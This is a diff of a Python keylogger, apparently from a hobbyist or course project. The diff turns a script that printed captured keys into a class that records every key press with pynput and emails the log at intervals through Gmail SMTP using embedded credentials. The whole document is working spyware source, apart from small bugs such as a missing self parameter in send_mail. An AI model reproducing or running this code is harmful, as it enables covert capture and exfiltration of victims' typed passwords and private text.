@@ -1,31 +1,46 @@
 #!usr/bin/env python
 import pynput.keyboard
 import threading
-
-log = ""
+import smtplib
 
 class Keylogger:
-    def process_key_press(self,key):
-        global log
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+    def process_key_press(self, key):
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
+            # self.append_to_log(str(key.char))
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = ""
             else:
-                log = log + " " +str(key) + " "
-        # print(log)
+                current_key =  "  " + str(key) + "  "
+        self.append_to_log(current_key)
 
     # this is used to set the timer and intervals
     def report(self):
-        global log
-        print(log)
-        log = ""
-        timer = threading.Timer(300,report)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = " "
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
 
+    def send_mail(email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
-            report()
+            self.report()
             keyboard_listener.join()
